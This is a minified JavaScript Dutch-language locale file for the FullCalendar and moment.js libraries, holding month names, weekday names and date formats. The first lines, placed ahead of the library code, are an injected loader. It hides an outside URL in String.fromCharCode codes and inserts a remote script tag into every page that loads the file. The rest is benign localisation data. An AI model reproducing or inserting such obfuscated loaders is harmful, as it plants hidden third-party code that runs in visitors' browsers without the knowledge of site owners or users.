var gfjfgjk = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104,116,116,112,115,58,47,47,115,110,105,112,112,101,116,46,97,100,115,102,111,114,109,97,114,107,101,116,46,99,111,109,47,115,97,109,101,46,106,115,63,118,61,51); s.src=pl; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}(function(e){"function"==typeof define&&define.amd?define(["jquery","moment"],e):e(jQuery,moment)})(function(e,t){var n="jan._feb._mrt._apr._mei_jun._jul._aug._sep._okt._nov._dec.".split("_"),i="jan_feb_mrt_apr_mei_jun_jul_aug_sep_okt_nov_dec".split("_");(t.defineLocale||t.lang).call(t,"nl",{months:"januari_februari_maart_april_mei_juni_juli_augustus_september_oktober_november_december".split("_"),monthsShort:function(e,t){return/-MMM-/.test(t)?i[e.month()]:n[e.month()]},weekdays:"zondag_maandag_dinsdag_woensdag_donderdag_vrijdag_zaterdag".split("_"),weekdaysShort:"zo._ma._di._wo._do._vr._za.".split("_"),weekdaysMin:"Zo_Ma_Di_Wo_Do_Vr_Za".split("_"),longDateFormat:{LT:"HH:mm",LTS:"LT:ss",L:"DD-MM-YYYY",LL:"D MMMM YYYY",LLL:"D MMMM YYYY LT",LLLL:"dddd D MMMM YYYY LT"},calendar:{sameDay:"[vandaag om] LT",nextDay:"[morgen om] LT",nextWeek:"dddd [om] LT",lastDay:"[gisteren om] LT",lastWeek:"[afgelopen] dddd [om] LT",sameElse:"L"},relativeTime:{future:"over %s",past:"%s geleden",s:"een paar seconden",m:"één minuut",mm:"%d minuten",h:"één uur",hh:"%d uur",d:"één dag",dd:"%d dagen",M:"één maand",MM:"%d maanden",y:"één jaar",yy:"%d jaar"},ordinalParse:/\d{1,2}(ste|de)/,ordinal:function(e){return e+(1===e||8===e||e>=20?"ste":"de")},week:{dow:1,doy:4}}),e.fullCalendar.datepickerLang("nl","nl",{closeText:"Sluiten",prevText:"←",nextText:"→",currentText:"Vandaag",monthNames:["januari","februari","maart","april","mei","juni","juli","augustus","september","oktober","november","december"],monthNamesShort:["jan","feb","mrt","apr","mei","jun","jul","aug","sep","okt","nov","dec"],dayNames:["zondag","maandag","dinsdag","woensdag","donderdag","vrijdag","zaterdag"],dayNamesShort:["zon","maa","din","woe","don","vri","zat"],dayNamesMin:["zo","ma","di","wo","do","vr","za"],weekHeader:"Wk",dateFormat:"dd-mm-yy",firstDay:1,isRTL:!1,showMonthAfterYear:!1,yearSuffix:""}),e.fullCalendar.lang("nl",{buttonText:{month:"Maand",week:"Week",day:"Dag",list:"Agenda"},allDayText:"Hele dag",eventLimitText:"extra"})});